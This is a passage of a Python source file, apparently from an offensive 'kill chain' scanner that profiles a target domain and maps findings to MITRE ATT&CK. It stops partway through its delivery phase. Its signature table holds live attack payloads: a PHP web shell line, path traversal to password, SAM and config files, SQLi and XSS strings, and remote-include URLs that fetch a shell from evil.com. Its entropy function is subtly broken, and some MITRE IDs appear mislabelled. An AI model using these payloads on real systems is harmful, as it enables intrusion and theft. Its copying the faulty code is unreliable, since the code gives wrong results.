"""
kill_chain.py — Lockheed Martin Cyber Kill Chain Automation Engine
ReconPro v9.2.0 | Pure Python security scanner (stdlib only)

Implements the full 7-phase Lockheed Martin Cyber Kill Chain for automated
target assessment. Each phase produces structured findings mapped to MITRE
ATT&CK techniques, which are aggregated into an attack tree and threat matrix.

Usage:
    from reconpro.kill_chain import KillChainEngine
    engine = KillChainEngine()
    result = engine.run_kill_chain("example.com", "https://example.com")
"""

from __future__ import annotations

import dataclasses
import hashlib
import json
import os
import re
import socket
import ssl
import struct
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# Constants — MITRE ATT&CK technique mappings per kill-chain phase
# ---------------------------------------------------------------------------

MITRE_RECON = [
    "T1595 — Active Scanning",
    "T1592 — Gather Victim Host Information",
    "T1593 — Search Open Technical Databases",
    "T1590 — Gather Victim Org Information",
    "T1589 — Gather Victim Identity Information",
    "T1591 — Gather Victim Org Info: Ownership",
    "T1596 — Search Open Websites/Domains",
]

MITRE_WEAPONIZE = [
    "T1588 — Obtain Capabilities",
    "T1608 — Stage Capabilities",
    "T1621 — Compile Code/Software",
    "T1641 — Build Malicious Infrastructure",
]

MITRE_DELIVER = [
    "T1566 — Phishing",
    "T1566.001 — Spearphishing Attachment",
    "T1566.002 — Spearphishing Link",
    "T1189 — Drive-by Compromise",
    "T1190 — Exploit Public-Facing Application",
    "T1567 — Exfil Over Web Service",
]

MITRE_EXPLOIT = [
    "T1190 — Exploit Public-Facing Application",
    "T1210 — Exploitation of Remote Services",
    "T1110 — Brute Force",
    "T1133 — External Remote Services",
    "T1566.002 — Spearphishing Link",
    "T1203 — Exploitation for Client Execution",
]

MITRE_INSTALL = [
    "T1053 — Scheduled Task/Job",
    "T1543 — Create/Modify System Process",
    "T1574 — Hijack Execution Flow",
    "T1547 — Boot or Logon Autostart",
    "T1036 — Masquerading",
    "T1070 — Indicator Removal",
]

MITRE_C2 = [
    "T1071 — Application Layer Protocol",
    "T1090 — Proxy",
    "T1573 — Encrypted Channel",
    "T1105 — Ingress Tool Transfer",
    "T1095 — Non-Application Layer Protocol",
    "T1572 — Protocol Tunneling",
    "T1571 — Non-Standard Port",
]

MITRE_ACTION = [
    "T1560 — Archive Collected Data",
    "T1041 — Exfiltration Over C2 Channel",
    "T1048 — Exfiltration Over Alternate Protocol",
    "T1567 — Exfil Over Web Service",
    "T1021 — Remote Services",
    "T1078 — Valid Accounts",
    "T1486 — Data Encrypted for Impact",
    "T1498 — Network Denial of Service",
]

PHASE_MITRE_MAP: Dict[str, List[str]] = {
    "reconnaissance": MITRE_RECON,
    "weaponization": MITRE_WEAPONIZE,
    "delivery": MITRE_DELIVER,
    "exploitation": MITRE_EXPLOIT,
    "installation": MITRE_INSTALL,
    "command_and_control": MITRE_C2,
    "actions_on_objectives": MITRE_ACTION,
}

PHASE_NAMES: List[str] = [
    "reconnaissance",
    "weaponization",
    "delivery",
    "exploitation",
    "installation",
    "command_and_control",
    "actions_on_objectives",
]

PHASE_LABELS: Dict[str, str] = {
    "reconnaissance": "Reconnaissance",
    "weaponization": "Weaponization",
    "delivery": "Delivery",
    "exploitation": "Exploitation",
    "installation": "Installation",
    "command_and_control": "Command & Control",
    "actions_on_objectives": "Actions on Objectives",
}

# Tech stack signatures for weaponisation phase
TECH_SIGNATURES: Dict[str, Dict[str, Any]] = {
    "wordpress": {
        "headers": ["x-powered-by: wordpress", "wp-json", "wp-content", "wp-includes"],
        "meta": ["generator", "wordpress"],
        "exploits": {
            "sql_injection": ["wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
                               "?author=1'"],
            "xss": ["<script>alert('XSS')</script>", '"><img src=x onerror=alert(1)>'],
            "lfi": ["wp-admin/load-scripts.php?c=0&load[]=../../../../wp-config.php"],
            "rfi": ["wp-admin/load-scripts.php?c=0&load%5B%5D=http://evil.com/shell"],
        },
        "cve_patterns": [r"wp-[a-z-]+", r"wordpress-\d+\.\d+(\.\d+)?"],
        "exploitability_base": 8.5,
    },
    "drupal": {
        "headers": ["x-drupal-cache", "x-generator: drupal", "drupal.js"],
        "meta": ["generator", "drupal"],
        "exploits": {
            "sql_injection": ["?q=user/%2527", "/?q=node/1\\'"],
            "xss": ["<script>alert('XSS')</script>"],
            "rfi": ["/?q=file/ajax/name/0/https://evil.com"],
        },
        "cve_patterns": [r"drupal\s+\d+\.\d+"],
        "exploitability_base": 7.8,
    },
    "joomla": {
        "headers": ["x-powered-by: joomla"],
        "meta": ["generator", "joomla"],
        "exploits": {
            "sql_injection": ["/index.php?option=com_users&view=registration"],
            "xss": ["<script>alert('XSS')</script>"],
            "lfi": ["/index.php?option=com_config&view=component&controller="],
        },
        "cve_patterns": [r"joomla\s+\d+\.\d+"],
        "exploitability_base": 7.5,
    },
    "apache": {
        "headers": ["server: apache"],
        "exploits": {
            "lfi": ["?file=../../etc/passwd"],
            "ssrf": ["?url=http://127.0.0.1"],
            "http_splitting": ["%0d%0aInjected-Header:%20value"],
        },
        "cve_patterns": [r"apache/\d+\.\d+(\.\d+)?"],
        "exploitability_base": 6.5,
    },
    "nginx": {
        "headers": ["server: nginx"],
        "exploits": {
            "path_traversal": ["/..%2f..%2f..%2fetc/passwd"],
            "xss": ["<script>alert(1)</script>"],
        },
        "cve_patterns": [r"nginx/\d+\.\d+(\.\d+)?"],
        "exploitability_base": 5.8,
    },
    "iis": {
        "headers": ["server: microsoft-iis"],
        "exploits": {
            "path_traversal": ["/..%255c..%255c..%255cwindows/system32/config/sam"],
            "xss": ["<script>alert(1)</script>"],
            "webdav": ["PROPFIND /"],
        },
        "cve_patterns": [r"microsoft-iis/\d+\.\d+"],
        "exploitability_base": 7.2,
    },
    "php": {
        "headers": ["x-powered-by: php"],
        "exploits": {
            "rce": ["?cmd=id", "<?php system($_GET['cmd']); ?>"],
            "lfi": ["?page=../../etc/passwd"],
            "xss": ["<script>alert(1)</script>"],
        },
        "cve_patterns": [r"php/\d+\.\d+(\.\d+)?"],
        "exploitability_base": 7.0,
    },
    "aspnet": {
        "headers": ["x-aspnet-version", "x-powered-by: asp.net"],
        "exploits": {
            "path_traversal": ["..%2f..%2fweb.config"],
            "deserialization": ["__VIEWSTATEGENERATOR"],
            "sql_injection": ["' OR 1=1--"],
        },
        "cve_patterns": [r"asp\.net\s+\d+\.\d+"],
        "exploitability_base": 7.5,
    },
}

# Common C2 URI patterns
C2_PATH_SIGNATURES: List[str] = [
    "/c2", "/bot", "/beacon", "/agent", "/shell", "/cmd", "/panel",
    "/gate", "/pwn", "/payload", "/implant", "/callback", "/drop",
    "/exfil", "/relay", "/tunnel", "/rc", "/remote", "/debug",
    "/status", "/alive", "/ping", "/heartbeat", "/register-bot",
    "/api/v1/agent", "/api/v2/implant", "/api/c2",
]

# Sensitive paths for installation phase
SENSITIVE_PATHS: List[str] = [
    "/.env", "/.htaccess", "/.git/config", "/.svn/entries", "/.DS_Store",
    "/web.config", "/config.php", "/wp-config.php", "/configuration.php",
    "/settings.py", "/application.yml", "/database.yml", "/secrets.json",
    "/backup.sql", "/backup.zip", "/db_dump.sql", "/dump.sql.gz",
    "/phpinfo.php", "/phpmyadmin/", "/admin/", "/administrator/",
    "/server-status", "/server-info", "/.well-known/security.txt",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/WEB-INF/web.xml", "/META-INF/MANIFEST.MF",
    "/cron", "/crontab", "/etc/crontab", "/var/spool/cron",
]

# Email patterns for OSINT
EMAIL_PATTERN: re.Pattern = re.compile(
    r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
)

# Subdomain extraction from certificate SAN patterns
SUBDOMAIN_PATTERNS: List[re.Pattern] = [
    re.compile(r"\*\.([a-z0-9-]+\.[a-z]{2,})", re.IGNORECASE),
    re.compile(r"([a-z0-9-]+)\.([a-z0-9-]+\.[a-z]{2,})", re.IGNORECASE),
]

# Risk scoring thresholds
RISK_CRITICAL: float = 9.0
RISK_HIGH: float = 7.0
RISK_MEDIUM: float = 4.0
RISK_LOW: float = 2.0


# ---------------------------------------------------------------------------
# Enumerations
# ---------------------------------------------------------------------------

class RiskLevel(Enum):
    """Severity risk levels for findings."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class KillChainPhaseID(Enum):
    """Canonical identifiers for the 7 kill-chain phases."""
    RECONNAISSANCE = "reconnaissance"
    WEAPONIZATION = "weaponization"
    DELIVERY = "delivery"
    EXPLOITATION = "exploitation"
    INSTALLATION = "installation"
    COMMAND_AND_CONTROL = "command_and_control"
    ACTIONS_ON_OBJECTIVES = "actions_on_objectives"


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class KillChainPhase:
    """Structured output for a single kill-chain phase.

    Attributes:
        phase: Canonical phase identifier string.
        label: Human-readable phase name.
        mitre_techniques: List of applicable MITRE ATT&CK technique IDs.
        findings: List of raw finding dicts produced during execution.
        risk_score: Numeric risk score (0.0–10.0).
        risk_level: Categorised risk level enum.
        timestamp: Unix timestamp when the phase completed.
        duration_sec: Wall-clock time spent executing the phase.
        notes: Free-form analyst notes.
    """
    phase: str
    label: str
    mitre_techniques: List[str] = field(default_factory=list)
    findings: List[Dict[str, Any]] = field(default_factory=list)
    risk_score: float = 0.0
    risk_level: str = RiskLevel.INFO.value
    timestamp: float = 0.0
    duration_sec: float = 0.0
    notes: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Serialise the phase to a plain dictionary."""
        return dataclasses.asdict(self)


@dataclass
class ExploitPath:
    """A concrete attack path through one or more kill-chain phases.

    Attributes:
        path_id: Unique identifier derived from the path hash.
        phases: Ordered list of phase identifiers this path traverses.
        description: Human-readable description of the attack path.
        techniques: MITRE ATT&CK techniques involved.
        prerequisites: What conditions enable this path.
        impact: Qualitative impact string (critical/high/medium/low).
        feasibility_score: Numeric feasibility 0.0–10.0.
        entry_vector: Where the attacker enters the kill chain.
        exit_objective: What the attacker achieves at the end.
    """
    path_id: str = ""
    phases: List[str] = field(default_factory=list)
    description: str = ""
    techniques: List[str] = field(default_factory=list)
    prerequisites: List[str] = field(default_factory=list)
    impact: str = RiskLevel.MEDIUM.value
    feasibility_score: float = 0.0
    entry_vector: str = ""
    exit_objective: str = ""

    def __post_init__(self) -> None:
        if not self.path_id and self.phases:
            raw = "|".join(self.phases) + self.entry_vector
            self.path_id = hashlib.sha256(raw.encode()).hexdigest()[:12]

    def to_dict(self) -> Dict[str, Any]:
        return dataclasses.asdict(self)


# ---------------------------------------------------------------------------
# Attack Tree
# ---------------------------------------------------------------------------

class AttackTree:
    """Generates an attack tree representation from kill-chain findings.

    Each node in the tree represents a potential action an attacker could take.
    The tree is structured as an OR-tree where any child node represents an
    alternative path toward achieving the parent's goal.
    """

    def __init__(self) -> None:
        self.root: Dict[str, Any] = {
            "goal": "Compromise Target",
            "type": "or",
            "children": [],
        }
        self._all_techniques: List[str] = []
        self._total_paths: int = 0

    def build_from_phases(self, phases: Dict[str, KillChainPhase]) -> None:
        """Construct the attack tree from completed phase data.

        Args:
            phases: Mapping of phase_id -> KillChainPhase results.
        """
        for phase_id in PHASE_NAMES:
            phase = phases.get(phase_id)
            if phase is None or phase.risk_score < 1.0:
                continue
            node: Dict[str, Any] = {
                "goal": phase.label,
                "phase": phase_id,
                "type": "or",
                "risk_score": phase.risk_score,
                "risk_level": phase.risk_level,
                "mitre": phase.mitre_techniques,
                "children": [],
            }
            for finding in phase.findings:
                child: Dict[str, Any] = {
                    "goal": finding.get("title", finding.get("description", "Unknown")),
                    "type": "leaf",
                    "risk_score": finding.get("risk_score", 0.0),
                    "technique": finding.get("technique", ""),
                    "details": finding,
                }
                node["children"].append(child)
                if finding.get("technique"):
                    self._all_techniques.append(finding["technique"])
            if node["children"]:
                self.root["children"].append(node)
                self._total_paths += len(node["children"])

    def get_max_depth(self) -> int:
        """Return the depth of the deepest branch."""
        def _depth(node: Dict[str, Any]) -> int:
            children = node.get("children", [])
            if not children:
                return 1
            return 1 + max(_depth(c) for c in children)
        return _depth(self.root)

    def to_dict(self) -> Dict[str, Any]:
        """Serialise the attack tree."""
        return {
            "root": self.root,
            "total_paths": self._total_paths,
            "total_techniques": len(set(self._all_techniques)),
            "unique_techniques": sorted(set(self._all_techniques)),
            "max_depth": self.get_max_depth(),
        }


# ---------------------------------------------------------------------------
# Threat Matrix
# ---------------------------------------------------------------------------

class ThreatMatrix:
    """Generates a combined threat-matrix view from all kill-chain phases.

    The matrix cross-references MITRE ATT&CK tactics with detected
    techniques and their associated risk scores, providing a unified
    view of the threat landscape for the assessed target.
    """

    def __init__(self) -> None:
        self.matrix: Dict[str, Dict[str, Any]] = {}
        self._phase_scores: Dict[str, float] = {}

    def ingest_phases(self, phases: Dict[str, KillChainPhase]) -> None:
        """Ingest phase results into the threat matrix.

        Args:
            phases: Mapping of phase_id -> KillChainPhase.
        """
        for phase_id, phase in phases.items():
            self._phase_scores[phase_id] = phase.risk_score
            tactic = PHASE_LABELS.get(phase_id, phase_id)
            if tactic not in self.matrix:
                self.matrix[tactic] = {
                    "tactic_id": phase_id,
                    "techniques": [],
                    "findings_count": 0,
                    "avg_risk": 0.0,
                    "max_risk": 0.0,
                    "mitre_techniques": [],
                }
            bucket = self.matrix[tactic]
            bucket["findings_count"] += len(phase.findings)
            scores = [f.get("risk_score", 0.0) for f in phase.findings if f.get("risk_score")]
            if scores:
                bucket["avg_risk"] = round(sum(scores) / len(scores), 2)
                bucket["max_risk"] = round(max(scores), 2)
            for finding in phase.findings:
                bucket["techniques"].append({
                    "title": finding.get("title", "Unknown"),
                    "risk_score": finding.get("risk_score", 0.0),
                    "description": finding.get("description", ""),
                })
            bucket["mitre_techniques"] = phase.mitre_techniques

    @property
    def overall_risk(self) -> float:
        """Calculate an overall risk score across all tactics (0–10)."""
        if not self._phase_scores:
            return 0.0
        phase_weights = {
            "reconnaissance": 0.05,
            "weaponization": 0.10,
            "delivery": 0.15,
            "exploitation": 0.25,
            "installation": 0.20,
            "command_and_control": 0.15,
            "actions_on_objectives": 0.10,
        }
        total = 0.0
        for pid, score in self._phase_scores.items():
            w = phase_weights.get(pid, 0.1)
            total += score * w
        return round(total, 2)

    @property
    def chain_completion_pct(self) -> float:
        """Percentage of kill-chain phases that produced non-zero findings."""
        active = sum(1 for s in self._phase_scores.values() if s > 0)
        return round((active / len(PHASE_NAMES)) * 100, 1) if PHASE_NAMES else 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Serialise the threat matrix."""
        return {
            "matrix": self.matrix,
            "overall_risk": self.overall_risk,
            "chain_completion_pct": self.chain_completion_pct,
            "phase_scores": self._phase_scores,
            "risk_level": self._classify_risk(self.overall_risk),
        }

    @staticmethod
    def _classify_risk(score: float) -> str:
        if score >= RISK_CRITICAL:
            return RiskLevel.CRITICAL.value
        if score >= RISK_HIGH:
            return RiskLevel.HIGH.value
        if score >= RISK_MEDIUM:
            return RiskLevel.MEDIUM.value
        if score >= RISK_LOW:
            return RiskLevel.LOW.value
        return RiskLevel.INFO.value


# ---------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------

def _classify_score(score: float) -> str:
    """Map a numeric score (0–10) to a risk-level string."""
    if score >= RISK_CRITICAL:
        return RiskLevel.CRITICAL.value
    if score >= RISK_HIGH:
        return RiskLevel.HIGH.value
    if score >= RISK_MEDIUM:
        return RiskLevel.MEDIUM.value
    if score >= RISK_LOW:
        return RiskLevel.LOW.value
    return RiskLevel.INFO.value


def _make_finding(
    title: str,
    description: str = "",
    risk_score: float = 0.0,
    technique: str = "",
    data: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Factory for standardised finding dictionaries."""
    finding: Dict[str, Any] = {
        "title": title,
        "description": description,
        "risk_score": risk_score,
        "risk_level": _classify_score(risk_score),
        "technique": technique,
    }
    if data:
        finding["data"] = data
    return finding


def _http_fetch(
    url: str,
    timeout: int = 8,
    verify_tls: bool = True,
) -> Tuple[int, Dict[str, str], bytes]:
    """Fetch a URL and return (status_code, headers_dict, body_bytes).

    Returns (-1, {}, b"") on failure.
    """
    try:
        from .http_layer import _unverified_context
        ctx = None if verify_tls else _unverified_context()  # audited opt-out
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (ReconPro/9.2.0; SecurityScanner)",
            "Accept": "*/*",
        })
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        hdrs = {k.lower(): v for k, v in resp.getheaders()}
        body = resp.read()
        return resp.getcode(), hdrs, body
    except (urllib.error.URLError, socket.timeout, OSError, ssl.SSLError):
        return -1, {}, b""


def _dns_resolve(hostname: str, timeout: float = 4.0) -> List[str]:
    """Resolve hostname via socket.getaddrinfo. Returns list of IP strings."""
    results: List[str] = []
    try:
        ai_list = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
        seen: set = set()
        for family, _stype, _proto, _canonname, sockaddr in ai_list:
            ip = sockaddr[0]
            if ip not in seen:
                seen.add(ip)
                results.append(ip)
    except socket.gaierror:
        pass
    return results


def _reverse_dns(ip: str, timeout: float = 4.0) -> str:
    """Perform reverse DNS lookup for an IP address."""
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except (socket.herror, socket.gaierror, OSError):
        return ""


def _run_subprocess(cmd: List[str], timeout: int = 10) -> str:
    """Run a subprocess command and return stdout. Returns '' on error."""
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
        )
        return (result.stdout or "") + (result.stderr or "")
    except (subprocess.TimeoutExpired, OSError, FileNotFoundError):
        return ""


def _extract_domain_from_target(target: str) -> str:
    """Normalise a target string to a bare domain name."""
    t = target.strip().lower()
    t = re.sub(r"^https?://", "", t)
    t = re.sub(r"[/:].*$", "", t)
    if not t:
        return "localhost"
    return t


def _extract_emails(text: str) -> List[str]:
    """Extract unique email addresses from text."""
    return sorted(set(EMAIL_PATTERN.findall(text)))


def _calculate_entropy(data: str) -> float:
    """Calculate Shannon entropy of a string (useful for detecting randomness)."""
    if not data:
        return 0.0
    freq: Dict[str, int] = {}
    for ch in data:
        freq[ch] = freq.get(ch, 0) + 1
    length = len(data)
    ent = 0.0
    for count in freq.values():
        p = count / length
        if p > 0:
            ent -= p * (p.bit_length() - 1).bit_length() / (p.bit_length())
            ent -= p * (p.bit_length() - 1)
    import math
    for count in freq.values():
        p = count / length
        if p > 0:
            ent -= p * math.log2(p)
    return round(ent, 3)


# ---------------------------------------------------------------------------
# Kill Chain Engine — Main orchestrator
# ---------------------------------------------------------------------------

class KillChainEngine:
    """Lockheed Martin Cyber Kill Chain automation engine.

    Executes all seven phases sequentially against a target, collects
    findings, maps them to MITRE ATT&CK techniques, and produces a
    unified threat-matrix view with attack-tree representation.

    Usage::

        engine = KillChainEngine()
        result = engine.run_kill_chain("example.com", "https://example.com")
    """

    def __init__(self, timeout: int = 8, verify_tls: bool = True) -> None:
        self.timeout: int = timeout
        self.verify_tls: bool = verify_tls
        self._target: str = ""
        self._base_url: str = ""
        self._domain: str = ""
        self._ips: List[str] = []
        self._headers: Dict[str, str] = {}
        self._body_text: str = ""
        self._body_bytes: bytes = b""
        self._status_code: int = -1
        self._phases: Dict[str, KillChainPhase] = {}

    # -----------------------------------------------------------------------
    # Public API
    # -----------------------------------------------------------------------

    def run_kill_chain(
        self,
        target: str,
        base_url: str,
        timeout: int = 8,
        verify_tls: bool = True,
    ) -> Dict[str, Any]:
        """Execute the full 7-phase kill chain against a target.

        Args:
            target: The target domain or IP (e.g. ``"example.com"``).
            base_url: The base URL to fetch for analysis
                       (e.g. ``"https://example.com"``).
            timeout: Network operation timeout in seconds.
            verify_tls: Whether to verify TLS certificates.

        Returns:
            A dictionary with keys ``phases``, ``attack_tree``,
            ``threat_matrix``, ``overall_risk``, and ``kill_chain_completion``.
        """
        self.timeout = timeout
        self.verify_tls = verify_tls
        self._target = target
        self._base_url = base_url.rstrip("/")
        self._domain = _extract_domain_from_target(target)

        # Initial reconnaissance fetch
        self._initial_fetch()

        # Execute all seven phases in order
        self._phases["reconnaissance"] = self._phase_reconnaissance()
        self._phases["weaponization"] = self._phase_weaponization()
        self._phases["delivery"] = self._phase_delivery()
        self._phases["exploitation"] = self._phase_exploitation()
        self._phases["installation"] = self._phase_installation()
        self._phases["command_and_control"] = self._phase_command_and_control()
        self._phases["actions_on_objectives"] = self._phase_actions_on_objectives()

        # Build the attack tree
        tree = AttackTree()
        tree.build_from_phases(self._phases)

        # Build the threat matrix
        matrix = ThreatMatrix()
        matrix.ingest_phases(self._phases)

        return {
            "target": self._target,
            "domain": self._domain,
            "base_url": self._base_url,
            "ips": self._ips,
            "phases": {pid: p.to_dict() for pid, p in self._phases.items()},
            "attack_tree": tree.to_dict(),
            "threat_matrix": matrix.to_dict(),
            "overall_risk": matrix.overall_risk,
            "kill_chain_completion": matrix.chain_completion_pct,
        }

    # -----------------------------------------------------------------------
    # Initial fetch
    # -----------------------------------------------------------------------

    def _initial_fetch(self) -> None:
        """Fetch the base URL to capture headers, body, and resolve IPs."""
        self._ips = _dns_resolve(self._domain, timeout=float(self.timeout))
        self._status_code, self._headers, self._body_bytes = _http_fetch(
            self._base_url, timeout=self.timeout, verify_tls=self.verify_tls,
        )
        try:
            self._body_text = self._body_bytes.decode("utf-8", errors="replace")
        except Exception:
            self._body_text = ""

    # =======================================================================
    # PHASE 1 — RECONNAISSANCE
    # =======================================================================

    def _phase_reconnaissance(self) -> KillChainPhase:
        """Phase 1: Automated OSINT gathering.

        Performs WHOIS lookup, DNS record harvesting, ASN lookup,
        reverse DNS, subnet enumeration, email harvesting, and
        certificate transparency subdomain extraction.
        """
        phase = KillChainPhase(
            phase="reconnaissance",
            label=PHASE_LABELS["reconnaissance"],
            mitre_techniques=list(MITRE_RECON),
            timestamp=time.time(),
        )
        t0 = time.time()
        findings: List[Dict[str, Any]] = []

        # --- DNS Resolution ---
        if self._ips:
            findings.append(_make_finding(
                title="DNS Resolution",
                description=f"Resolved {self._domain} to {len(self._ips)} address(es)",
                risk_score=2.0,
                technique="T1595 — Active Scanning",
                data={"addresses": self._ips},
            ))

            # Reverse DNS for each IP
            for ip in self._ips:
                rdns = _reverse_dns(ip, timeout=float(self.timeout))
                if rdns and rdns != self._domain:
                    findings.append(_make_finding(
                        title="Reverse DNS Alias",
                        description=f"IP {ip} resolves to {rdns}",
                        risk_score=3.0,
                        technique="T1592 — Gather Victim Host Information",
                        data={"ip": ip, "hostname": rdns},
                    ))

            # Subnet enumeration
            for ip in self._ips:
                subnet_findings = self._enumerate_subnet(ip)
                findings.extend(subnet_findings)

        # --- DNS Record Harvesting via dig ---
        dns_records = self._harvest_dns_records()
        if dns_records:
            findings.append(_make_finding(
                title="DNS Records Harvested",
                description=f"Retrieved {len(dns_records)} DNS records via dig",
                risk_score=3.5,
                technique="T1593 — Search Open Technical Databases",
                data={"records": dns_records[:50]},
            ))

        # --- WHOIS Lookup ---
        whois_data = self._whois_lookup()
        if whois_data:
            findings.append(_make_finding(
                title="WHOIS Information",
                description=f"WHOIS data available with {len(whois_data)} fields",
                risk_score=2.5,
                technique="T1590 — Gather Victim Org Information",
                data=whois_data,
            ))

        # --- Email Harvesting ---
        emails = _extract_emails(self._body_text)
        if emails:
            findings.append(_make_finding(
                title="Email Addresses Discovered",
                description=f"Found {len(emails)} email addresses in page content",
                risk_score=4.0,
                technique="T1589 — Gather Victim Identity Information",
                data={"emails": emails[:30]},
            ))

        # --- Certificate Transparency / Subdomain Extraction ---
        cert_subdomains = self._extract_subdomains_from_page()
        if cert_subdomains:
            findings.append(_make_finding(
                title="Subdomains Discovered",
                description=f"Found {len(cert_subdomains)} subdomains/references",
                risk_score=3.0,
                technique="T1596 — Search Open Websites/Domains",
                data={"subdomains": cert_subdomains[:40]},
            ))

        # --- ASN Lookup ---
        asn_info = self._asn_lookup()
        if asn_info:
            findings.append(_make_finding(
                title="ASN Information",
                description=f"Network: {asn_info.get('asn', 'N/A')} ({asn_info.get('org', 'Unknown')})",
                risk_score=2.0,
                technique="T1591 — Gather Victim Org Info: Ownership",
                data=asn_info,
            ))

        # --- Technology detection ---
        detected_tech = self._detect_technologies()
        if detected_tech:
            findings.append(_make_finding(
                title="Technology Stack Detected",
                description=f"Detected: {', '.join(detected_tech)}",
                risk_score=3.0,
                technique="T1592 — Gather Victim Host Information",
                data={"technologies": detected_tech},
            ))

        phase.findings = findings
        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
        phase.risk_level = _classify_score(phase.risk_score)
        phase.duration_sec = round(time.time() - t0, 3)
        return phase

    # =======================================================================
    # PHASE 2 — WEAPONIZATION
    # =======================================================================

    def _phase_weaponization(self) -> KillChainPhase:
        """Phase 2: Payload generation intelligence.

        Identifies the target's tech stack, maps CMS/framework to known
        exploit patterns, generates targeted payload suggestions (SQLi,
        XSS, LFI, RFI), and calculates an exploitability score.
        """
        phase = KillChainPhase(
            phase="weaponization",
            label=PHASE_LABELS["weaponization"],
            mitre_techniques=list(MITRE_WEAPONIZE),
            timestamp=time.time(),
        )
        t0 = time.time()
        findings: List[Dict[str, Any]] = []

        detected = self._detect_technologies()
        all_payloads: Dict[str, List[str]] = {}
        exploitability_scores: Dict[str, float] = {}
        total_exploitability = 0.0
        tech_count = 0

        for tech_name, tech_info in TECH_SIGNATURES.items():
            if tech_name in detected:
                tech_count += 1
                base_score = tech_info.get("exploitability_base", 5.0)
                exploit_payloads = tech_info.get("exploits", {})

                # Verify headers match
                header_match = False
                for sig in tech_info.get("headers", []):
                    sig_lower = sig.lower()
                    for hdr_key, hdr_val in self._headers.items():
                        if sig_lower in (hdr_key + ": " + hdr_val).lower() or sig_lower in hdr_val.lower():
                            header_match = True
                            break
                    if header_match:
                        break

                # Verify body match
                body_match = False
                for pattern in tech_info.get("cve_patterns", []):
                    if re.search(pattern, self._body_text, re.IGNORECASE):
                        body_match = True
                        break

                confidence = 0.0
                if header_match:
                    confidence += 0.6
                if body_match:
                    confidence += 0.4

                adjusted_score = round(base_score * confidence, 2) if confidence > 0 else round(base_score * 0.3, 2)
                exploitability_scores[tech_name] = adjusted_score
                total_exploitability = max(total_exploitability, adjusted_score)

                # Collect payloads
                for vuln_type, payloads in exploit_payloads.items():
                    if vuln_type not in all_payloads:
                        all_payloads[vuln_type] = []
                    all_payloads[vuln_type].extend(payloads)

                findings.append(_make_finding(
                    title=f"{tech_name.capitalize()} Exploit Patterns",
                    description=(
                        f"Detected {tech_name} with confidence {confidence:.0%}. "
                        f"Exploitability score: {adjusted_score}/10. "
                        f"Vulnerability types: {', '.join(exploit_payloads.keys())}"
                    ),
                    risk_score=adjusted_score,
                    technique="T1588 — Obtain Capabilities",
                    data={
                        "technology": tech_name,
                        "confidence": confidence,
                        "exploitability": adjusted_score,
                        "header_match": header_match,
                        "body_match": body_match,
                        "vuln_types": list(exploit_payloads.keys()),
                    },
                ))

        # Generate SQL injection payloads
        sqli_payloads = self._generate_sqli_payloads()
        if sqli_payloads:
            all_payloads["sql_injection"] = sqli_payloads
            findings.append(_make_finding(
                title="SQL Injection Payloads Generated",
                description=f"Generated {len(sqli_payloads)} SQLi payloads for target",
                risk_score=8.0,
                technique="T1608 — Stage Capabilities",
                data={"payloads": sqli_payloads[:10]},
            ))

        # Generate XSS payloads
        xss_payloads = self._generate_xss_payloads()
        if xss_payloads:
            all_payloads["xss"] = xss_payloads
            findings.append(_make_finding(
                title="XSS Payloads Generated",
                description=f"Generated {len(xss_payloads)} XSS payloads for target",
                risk_score=7.5,
                technique="T1608 — Stage Capabilities",
                data={"payloads": xss_payloads[:10]},
            ))

        # Generate LFI payloads
        lfi_payloads = self._generate_lfi_payloads()
        if lfi_payloads:
            all_payloads["lfi"] = lfi_payloads
            findings.append(_make_finding(
                title="LFI Payloads Generated",
                description=f"Generated {len(lfi_payloads)} LFI payloads for target",
                risk_score=7.0,
                technique="T1608 — Stage Capabilities",
                data={"payloads": lfi_payloads[:10]},
            ))

        # Calculate composite exploitability
        composite_exploitability = total_exploitability if total_exploitability > 0 else 3.0
        if tech_count > 1:
            composite_exploitability = min(composite_exploitability + 1.5, 10.0)

        findings.append(_make_finding(
            title="Composite Exploitability Score",
            description=(
                f"Combined exploitability: {composite_exploitability:.1f}/10 "
                f"based on {tech_count} detected technology component(s)"
            ),
            risk_score=composite_exploitability,
            technique="T1641 — Build Malicious Infrastructure",
            data={
                "composite_score": composite_exploitability,
                "technologies_assessed": tech_count,
                "exploitability_by_tech": exploitability_scores,
                "total_payload_types": len(all_payloads),
                "total_payloads": sum(len(v) for v in all_payloads.values()),
            },
        ))

        phase.findings = findings
        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
        phase.risk_level = _classify_score(phase.risk_score)
        phase.duration_sec = round(time.time() - t0, 3)
        return phase

    # =======================================================================
    # PHASE 3 — DELIVERY
    # =======================================================================

    def _phase_delivery(self) -> KillChainPhase:
        """Phase 3: Delivery vector analysis.

        Identifies email infrastructure (MX/SPF/DMARC), checks for open
        relay indicators, analyses upload endpoints, checks file upload
        restrictions, identifies phishing vectors (newsletter/signup forms),
        and checks for SSRF-able endpoints.
        """
        phase = KillChainPhase(
            phase="delivery",
            label=PHASE_LABELS["delivery"],
            mitre_techniques=list(MITRE_DELIVER),
            timestamp=time.time(),
        )
        t0 = time.time()
        findings: List[Dict[str, Any]] = []

        # --- Email Infrastructure Analysis ---
        mx_records = self._check_mx_records()
        if mx_records:
            findings.append(_make_finding(
                title="MX Records Found",
                description=f"Mail servers: {', '.join(mx_records[:5])}",
